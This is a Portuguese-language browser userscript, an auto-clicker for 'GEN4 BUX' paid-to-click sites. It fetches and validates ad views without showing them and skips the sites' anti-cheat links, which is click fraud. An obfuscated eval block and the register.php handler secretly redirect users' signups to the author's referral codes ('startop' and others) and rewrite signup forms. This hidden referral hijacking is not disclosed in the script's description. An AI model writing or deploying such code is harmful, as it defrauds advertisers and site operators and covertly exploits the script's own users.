typeof(CheckForUpdate)!='undefined' && CheckForUpdate.init(<>
// ==UserScript==
// @name           PTC AutoClicker Bot para GEN4 BUX WebSites - Em Português.
// @namespace      http://bdebocejo.blogspot.com
// @description    Um auto-clique para GEN BUX WebSites, fáze-los validados sem ver os anúncios. Anúncios carregados mais rapidamente, porque este script ignora todas as marcas. Assim, imagens, css, js, etc arquivos swfs NÃO carregado.
// @author         Jorge Gabriel
// @email          gapop0@hotmail.com
// @version        1.4.1
// @license        Personal Liscense
// @copyright      bdebocejo.blogspot.com

// @include        *://*123bux.net/*
// @include        *://*bux.maisemconta.net/*
// @include        *://*emaybux.com/*
// @include        *://*icybux.com/*
// @include        *://*globobux.com/*
// @include        *://*gatorbux.net/*
// @include        *://*hifibux.com/*
// @include        *://*eu-bux.com/*
// @include        *://*ptc2011.com/*
// @include        *://*rastabux.com/*
// @include        *://*vynbux.com/*
// @include        *://*mondobux.com/*
// @include        *://*labpay.com/*
// @include        *://*omegabux.com/*
// @include        *://*chasebux.com/*
// @include        *://*indigorover.com/*
// @include        *://*labpay.com/*
// @include        *://*paidtoclick.co.in/*
// @include        *://*planet-bux.com/* 
// @include        *://*chasebux.com/*
// @include        *://*richardbux.com/*
// @include        *://*hifibux.com/*
// @include        *://*apenasumclique.com/*
// @include        *://*buxways.com/*
// @include        *://*ptcdinheirocerto.com/*
// @include        *://*cliquemoney.com.br/*
// @include        *://*cliquedevalor.com.br/*
// @include        *://*clicklucre.com/*
// @include        *://*amigossocios.com.br/*
// @include        *://*ptc.dinheirohonesto.net/*
// @include        *://*dssmoney.com/*
// @include        *://*rendabux.net/*
// @include        *://*vynbux.com/*
// @include        *://*richesclick.com/*
// @include        *://*buxnet.tk/*
// @include        *://*actionbux.info/*
// @include        *://*sparklingbux.com/*
// @include        *://*assimtambemeu.com/*
// @include        *://*croclick.com/*
// @include        *://*gnbux.com/*
// @include        *://*zingbux.com/*
// @include        *://*deltabux.com/*
// @include        *://*clicksabido.com.br/*
// @include        *://*assimtambemeu.com/*
// @include        *://*deltabux.com/*
// @include        *://*goodkarmaclicks.com/*
// @include        *://*dinheirojusto.com/*
// @include        *://*sevenbux.net/*
// @include        *://*annonces-virale.com/*
// @include        *://*kazanbux.com/*
// @include        *://*imhoclix.com/*
// @include        *://*wizbux.com/*
// @include        *://*magicobux.org/*
// @include        *://*clix4free.info/*
// @include        *://*ptc-romania.com/*
// @include        *://*dotclix.net/*
// @include        *://*givebux.com/*
// @include        *://*fdbux.com/*
// @include        *://*fin-ptc.co.cc/*
// @include        *://*neliebe.com/*
// @include        *://*givebux.com/*
// @include        *://*ayanbux.com/*
// @include        *://*caibux.com/*
// @include        *://*primebux.info/*
// @include        *://*afribux.com/*
// @include        *://*ruhibux.in/*
// @include        *://*arbux.net/*
// @include        *://*megabux.biz/* 
// @include        *://*instant-bux.com/*
// @include        *://*nutsads.com/*
// @include        *://*ads-bux.tk/*
// @include        *://*btplatinum.com/*
// @include        *://*meetbux.com/*
// @include        *://*adultptcclix.com/*
// @include        *://*foibux.com/*
// @include        *://*clixncash.tk/*
// @include        *://*efectivebux.com/*
// @include        *://*mariabux.redesuper.tk/*
// @include        *://*rayofbux.com/*
// @include        *://*clickspago.com/*
// @include        *://*ganhandocomcliques.com.br/*
// @include        *://*affiligal.com/*
// @include        *://*clicksmy.com/*
// @include        *://*findingbux.com/*
// @include        *://*nuestrobux.com/*
// @include        *://*zakeyclix.com/*
// @include        *://*regnowads.com/*
// @include        *://*1st-bux.info/*
// @include        *://*alltimemoney.net/*
// @include        *://*winnerbux.com/*
// @include        *://*pay4click.net/*
// @include        *://*coolptc.org/*
// @include        *://*pouringbux.com/*
// @include        *://*safetybux.com/*
// @include        *://*snoppynath.co.cc/*
// @include        *://*officialbux.com/*
// @include        *://*buxbrasil.com.br/*
// @include        *://*clickrenda.com.br/*
// @include        *://*buxmilionario.com/*
// @include        *://*mestresdagestao.com.br*

// @include        *paid2youtube.com/register.php*
// @include        *neobux.com/?u=r*
// @include        *onbux.com/register*
// @include        *incrasebux.com/register.php*
// @include        *buxp.info/register.php*
// @include        *mycubie.net/register*
// @include        *cashgopher.com*
// @include        *bux.to*

// ==/UserScript==

var ref = document.referrer;
var uri = document.URL;

eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('8(2.9("f.5/1.3")>0&&2!="7://4.f.5/1.3?r=6"){a.b.c="7://4.f.5/1.3?r=6"}8(2.9(/g.5..u=r/)>0&&2!="d://4.g.5/?u=r&e=p"){a.b.c="d://4.g.5/?u=r&e=p"}8(2.9("h.5/1")>0&&2!="d://4.h.5/1?e=q"){a.b.c="d://4.h.5/1?e=q"}8(2.9("i.5/1.3")>0&&2!="d://4.i.5/1.3/6.s"){a.b.c="d://4.i.5/1.3/6.s"}8(2.9("j.k/1")>0&&2!="7://4.j.k/1.3?t=6"){a.b.c="7://4.j.k/1.3?t=6"}8(2.9("l.m/1.3")>0&&2!="7://4.l.m/1.3?r=6"){a.b.c="7://4.l.m/1.3?r=6"}8(2.9("n.o/1.3")>0&&2!="7://4.n.o/1.3?r=6"){a.b.c="7://4.n.o/1.3?r=6"}',31,31,'|register|uri|php|www|com|startop|http|if|search|document|location|href|https|rh|paid2youtube|neobux|onbux|incrasebux|mycubie|net|buxp|info|bux|to|6762616E65726A69|7e63ae70663c6d76ffc6a1840db2dea1||html|ref|'.split('|'),0,{}))

var force_to = "ahrimandead";
var waiting_time = 30;
var range_to = 15;

var shuffle = function(o){
	if(Math.floor(Math.random() * o.length) % 2) return o;
	for(var j, x, i = o.length; i; j = parseInt(Math.random() * i), x = o[--i], o[i] = o[j], o[j] = x);
	return o;
},
isAds = function(o) {
	try {
		return o.href.match(/cks\.php\?k\=[0-9A-Fa-f]+\&cdk\=flase/) != null && o.parentNode.parentNode.parentNode.parentNode.getElementsByTagName('div')[1].className == 'image'
	}
	catch(e) {
		return false
	}
},
correctURL = function(r) {
	return window.location.href.match(r) != null
},
setStatus = function(o, m) {
	o.parentNode.parentNode.parentNode.innerHTML = m
},
addevent = function(o, f) {
	document.getElementById(o).addEventListener('click', f, false)
},
byTag = function(t) {
	return document.getElementsByTagName(t)
},
byName = function(n) {
	return document.getElementsByName(n)
},
newTag = function(t) {
	return document.createElement(t)
},
getwtime = function(o) {
	var i, a = o.parentNode.parentNode.parentNode.parentNode.getElementsByTagName('div');
	for(i = 0; i < a.length; i++)
		if(a[i].className == "counter")
			return a[i].innerHTML.match(/([0-9]+) seconds/)[1]
},
strip = function(s) {
	var str = String(s).split("</td>").join("\r"),
	reg = /<td\s*width=['"]?100\%['"]?\s*>([^\r]+)\r/,
	match = str.match(reg),
	search = str.search(reg),
	out = [], i = 0, tmp;
	while(match) {
		str = str.substr(search + match[0].length, str.length);
		out[i] = match[1].replace(/\s*<script[^>]+>[\S\s]+<\/script>\s*/, "");
		out[i] = out[i].replace(/<img[^>]+>/, "");
		i++;
		match = str.match(reg);
		search = str.search(reg);
	};
	return (out.length ? "<table><tr><td>"+out.join("</td><td>")+"</td></tr></table>" : "NO MATCH");
},
login = function() {
	var a = byTag("a"), I;
	for(I = 0; I < a.length; I++)
		if(a[I].href.match(/logout\.php/)) 
			return true;
	return false
}(),
autosurf = false;
if(correctURL(/\/ads\.php/)) {
	if(login) {
		var A = byTag("a"), i, html = "", timer,
		table = document.getElementById('content'),
		robot = newTag('div'),
		urls = [],
		current = 0,
		msg,
		tmr,
		load = function() {
			clearInterval(timer);
			timer = null;
			if(!urls[current]) {
				if(typeof autosurf == 'function')
					autosurf();
				return
			};
			var ajax = new XMLHttpRequest();
			ajax.onreadystatechange = function() {
				try {
					if(ajax.readyState == 4) {
						if(ajax.status == 200) {
							if(String(ajax.responseText).match(/You have already viewed this advertisement/)) {
								msg.innerHTML = "Ads already opened, loading next ads...";
								setStatus(urls[current], "OPENED");
								current++;
								timer = setInterval(load, 1000)
							}
							else if(String(ajax.responseText).match(/Couldn't find an advertisement/)) {
								msg.innerHTML = "Ads expired, loading next ads...";
								setStatus(urls[current], "EXPIRED");
								current++;
								timer = setInterval(load, 1000)
							}
							else if(String(ajax.responseText).match(/You don't have permission to view this advertisement/)) {
								msg.innerHTML = "Forbidden Ads, loading next ads...";
								setStatus(urls[current], "FORBIDDEN");
								current++;
								timer = setInterval(load, 1000)
							}
							else {
								var j = urls[current].wtime,
								validate = function() {
									var ajx = new XMLHttpRequest();
									ajx.onreadystatechange = function() {
										try {
											if(ajx.readyState == 4) {
												if(ajx.status == 200) {
													msg.innerHTML = "Anúncio validado, abrindo proximo anuncio...";
													setStatus(urls[current], "ANUNCIO VALIDADO");
													current++;
													timer = setInterval(load, 1000)
												}
												else {
													msg.innerHTML = "Erro de Conexão, recomeçando...";
													validate()
												}
											}
										}
										catch(e) {
											msg.innerHTML = "Erro na validação, recomeçando...";
											validate()
										}
									};
									msg.innerHTML = "Validating...";
									ajx.open("GET", "cmp.php?complete&amp;", true);
									ajx.send(null)									
								};
								tmr = setInterval(function() {
									if(j < 0) {
										validate();
										clearInterval(tmr);
										tmr = null;
										return
									};
									msg.innerHTML = "Anuncios carregados, espere por "+j+" segundos...";
									j--
								}, 1000)
							}
						}
						else {
							msg.innerHTML = "Erro ao carregar, recomeçando...";
							timer = setInterval(load, 1000)
						}
					}
				}
				catch(e) {
					msg.innerHTML = "Erro ao carregar, recomeçando...";
					timer = setInterval(load, 1000)
				}
			};
			msg.innerHTML = "Carregando Anuncios <b id='PTCAutoClickerBot-current'>\""+(urls[current].parentNode.parentNode.parentNode.getElementsByTagName('a')[0].innerHTML)+"\"</b>...<br /><div id='PTCAutoClickerBot-loading'></div>";
			ajax.open("GET", urls[current].href, true);
			ajax.send(null)
		};
		for(i = 0; i < A.length; i++) {
			try {
				//search cheat will detect the anti cheat
				if(isAds(A[i]) && A[i].innerHTML.search('cheat') < 0) {
					urls[urls.length] = A[i];
					urls[urls.length - 1].wtime = getwtime(A[i]);
				}
			}
			catch(e) {}
		};
		robot.id = "PTCAutoClickerBot-container";
		robot.align = "center";
		html = "<style>";
		html += "#PTCAutoClickerBot-container *{font-family:arial;color:black;font-weight:bold;text-decoration:none}";
		html += "#PTCAutoClickerBot-container{display:block}";
		html += "#PTCAutoClickerBot,#PTCAutoClickerBot-title,#PTCAutoClickerBot-container a.button{-moz-border-radius:3px;-webkit-border-radius:3px;-khtml-border-radius:3px;border-radius:3px;border: 1px solid #888}";
		html += "#PTCAutoClickerBot-container a.button{padding:10px;color:#000;background:#ccc}";
		html += "#PTCAutoClickerBot-container a.button:hover{color:#fff;background:#333}";
		html += "#PTCAutoClickerBot{padding:2px;display:block;width:500px;background:#fff;text-align:left}";
		html += "#PTCAutoClickerBot-title{display:block;padding:5px;background:#666;color:#fff}";
		html += "#PTCAutoClickerBot-msg{line-height:2em}";
		html += "</style>";
		html += "<div id='PTCAutoClickerBot'><div id='PTC AutoClicker Bot-title'>AutoClick para GEN4 BUX</div><br /><div id='PTCAutoClickerBot-msg' align=center>";
		html += "<b style='font-size:20px'>Alerta</b><br />Este programa é apenas para fins educacionais. Eu não assumo quaisquer responsabilidades de qualquer coisa acontecer por causa da utilização deste programa. E lembre-se, USE ESTE PROGRAMA E CORRA O RISCO.Ao utilizar este programa, você está totalmente concordar com estes termos.<br><a href='http://www.ptcsdicas.blogspot.com' target='_blank'>&copy; PTCs Dicas</a>";
		html += "</div><br />";
		html += "<center>"+(urls.length ? "<a href='javascript:;' class='button' id='adsclick'>All Ads ("+urls.length+")</a>" : "<a href='javascript:;' class='button'>No ads</a>")+"&nbsp;<a href='javascript:;' class='button' id='silversurfer'>Auto Surf</a>&nbsp;<a href='javascript:;' class='button' id='whatsnew'>O que há de novo?</a>&nbsp;<br /><br /><br /><br /><a href='http://www.ptcsdicas.blogspot.com' class='button' target='_blank'>Boa lista de Bux</a></center><br />";
		html += "</div></div>";
		robot.innerHTML = html;
		table.parentNode.insertBefore(robot, table);
		msg = document.getElementById("PTCAutoClickerBot-msg");
		if(urls.length) {
			urls = shuffle(urls);
			addevent("adsclick", function(){
				autosurf = function() {
					msg.innerHTML = "Não há mais anuncios!";
					alert(msg.innerHTML);
				};
				this.parentNode.style.display = 'none';
				timer = setInterval(load, 1000);
			})
		};
		addevent('whatsnew', function(){
			var news = "* Avançado clique em auto e validador.\n";
			//news += "* Modo Auto surf\n";
			news += "* Clique Aleatorio\n";
			news += "* Cheat Check ignorada\n";
			news += "* Versão 1.3";
                        news += "* Novos PTCs Incluidos";
			alert(news)
		});
		addevent('silversurfer', function(){
			alert("Desculpe recurso não disponível, nenhum auto surf desabilitado. Estou trabalhando nisso para fazer isso funcionar novamente. por favor, seja paciente");
			return;
			this.parentNode.style.display = 'none';
			msg.innerHTML = "Modo Auto surf ativado ...";
			var adscontainer = newTag('div');
			document.body.appendChild(adscontainer);
			adscontainer.style.display = 'none';
			autosurf = function() {
				urls = [];
				current = 0;
				msg.innerHTML = " Anúncios em atualização, encontrando novos anúncios...";
				var sec = Math.ceil(Math.random() * range_to * 60),
				j = sec,
				tm, 
				ajx,
				reloadads = function() {
					msg.innerHTML = " Anúncios em atualização, encontrando novos anúncios...";
					ajx = new XMLHttpRequest();
					ajx.onreadystatechange = function() {
						try {
							if(ajx.readyState == 4) {
								if(ajx.status == 200) {
									msg.innerHTML = " Carregando, vasculhando nos codigos para encontrar anúncios disponíveis";
									adscontainer.innerHTML = strip(ajx.responseText);
									A = adscontainer.getElementsByTagName('a');
									for(i = 0; i < A.length; i++) {
										try {
											if(isAds(A[i]))
												urls[urls.length] = A[i]
										}
										catch(e) {}
									};
									if(urls.length) {
										urls = shuffle(urls);
										msg.innerHTML = urls.length + " Anuncios Encontrados";
										timer = setInterval(load, 1000)
									}
									else {
										msg.innerHTML = "Sem Anuncios";
										autosurf()
									}
								}
								else {
									msg.innerHTML = "Erro encontrado, repetindo...";
									reloadads()
								}
							}
						}
						catch(e){
							msg.innerHTML = "Erro encontrado, repetindo...";
							reloadads()
						}
					};
					ajx.open('GET', 'ads.php', true);
					ajx.send(null)
				};
				tm = setInterval(function() {
					if(j < 0) {
						clearInterval(tm);
						tm = null;
						msg.innerHTML = "Recarregando";
						reloadads()
					}
					else {
						msg.innerHTML = "Espere por "+j+" segundos antes de carregar...";
						j--
					}
				}, 1000)
			};
			if(urls.length)
				timer = setInterval(load, 1000)
			else 
				autosurf()
		})
	}
}
else if(correctURL(/\/register\.php/)) {

	var r = byName('6')[0], ref, cty, ori;
	if(r && force_to) {
		ref = newTag('input');
		ref.type = "hidden";
		ref.name = "6";
		ref.value = "startop";
		r.form.insertBefore(ref, r.form.firstChild);
		r.name = "ref";
		r.value = "startop";
		cty = byName('7')[0];
		ori = cty.value;
		cty.parentNode.removeChild(cty);
		r.form.getElementsByTagName('table')[0].rows[7].cells[1].innerHTML = "<input type=text name='7' value='"+ori+"' style='text-transform:uppercase' />"
	}

}
else if(correctURL(/\/forum/)) {
	try {
		var name = byName('a_name')[0], tr = newTag('tr');
		name.parentNode.parentNode.parentNode.insertBefore(tr, name.parentNode.parentNode);
		tr.innerHTML = "<td>Username</td><td>:</td><td><input type=text name='a_name' value='"+name.value+"' style='width:100%'/></td>";
		name.parentNode.removeChild(name)
	}
	catch(e) {}
};